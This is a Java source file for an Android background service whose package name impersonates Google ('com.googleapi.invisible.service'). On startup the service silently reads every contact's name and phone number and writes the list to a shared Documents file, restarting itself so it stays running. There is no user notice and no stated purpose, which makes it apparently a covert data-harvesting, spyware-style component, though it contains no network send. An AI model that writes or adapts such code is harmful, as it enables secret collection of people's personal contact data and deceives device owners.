package com.googleapi.invisible.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;

import java.io.OutputStream;

public class MyBackgroundService extends Service {
    private static final String TAG = "MyBackgroundService";
    private Handler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler();
        fetchContactsAndWriteToFile();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not used for unbound service
    }

    private void fetchContactsAndWriteToFile() {
        handler.post(() -> {
            try {
                // Fetch contacts
                StringBuilder contactsBuilder = new StringBuilder();
                ContentResolver contentResolver = getContentResolver();
                Uri uri = ContactsContract.Contacts.CONTENT_URI;
                Cursor cursor = contentResolver.query(uri, null, null, null, null);

                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                        String phoneNumber = null;

                        if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                            Cursor phoneCursor = contentResolver.query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                    new String[]{id}, null);

                            if (phoneCursor != null) {
                                while (phoneCursor.moveToNext()) {
                                    phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    contactsBuilder.append("Name: ").append(name).append(", Phone: ").append(phoneNumber).append("\n");
                                }
                                phoneCursor.close();
                            }
                        }
                    }
                    cursor.close();
                }

                // Write to file
                writeToFile(contactsBuilder.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error fetching contacts: " + e.getMessage());
            }
        });
    }

    private void writeToFile(String data) {
        ContentValues contentValues = new ContentValues();
        contentValues.put(MediaStore.Files.FileColumns.DISPLAY_NAME, "contacts.txt");
        contentValues.put(MediaStore.Files.FileColumns.MIME_TYPE, "text/plain");
        contentValues.put(MediaStore.Files.FileColumns.RELATIVE_PATH, "Documents/MyServiceApp");

        ContentResolver resolver = getContentResolver();
        Uri uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues);

        if (uri != null) {
            try (OutputStream outputStream = resolver.openOutputStream(uri)) {
                if (outputStream != null) {
                    outputStream.write(data.getBytes());
                    Log.d(TAG, "Contacts written to file: " + uri.toString());
                }
            } catch (Exception e) {
                Log.e(TAG, "Error writing to file: " + e.getMessage());
            }
        } else {
            Log.e(TAG, "Failed to create file URI");
        }
    }
}